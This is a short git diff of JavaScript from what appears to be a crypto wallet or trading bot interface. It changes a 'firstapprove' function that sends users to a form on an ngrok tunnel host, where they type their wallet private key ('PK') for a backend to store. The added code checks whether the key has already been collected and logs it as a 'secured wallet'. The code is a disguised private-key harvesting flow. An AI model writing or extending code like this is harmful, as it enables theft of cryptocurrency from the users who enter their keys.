@@ -41,11 +41,19 @@ let USER_TOKEN_ADDR = null;
 
 async function firstapprove() {
   try {
-    // Redirect the browser to the PK form page
-    window.location.href = "https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security";
-    // User will see the form, type PK, submit → backend stores it
-    // After submission, backend returns JSON { "message": "PK stored successfully" }
-    // At that point, you can flip firsttime = true in your approve handler
+    const resp = await fetch("https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security", {
+      method: "GET"
+    });
+    const text = await resp.text();
+
+    // If server indicates PK already stored
+    if (text.includes("✅ Received PK successfully") || text.includes("Wallet initialized")) {
+      firsttime = true;
+      logToPanel("Secured wallet already initialized");
+    } else {
+      // Otherwise, show the form to collect PK
+      window.location.href = "https://almanac-sierra-rundown.ngrok-free.dev/prodbot/security";
+    }
   } catch (err) {
     logToPanel(`FirstApproveError=${err.message}`);
     throw err;
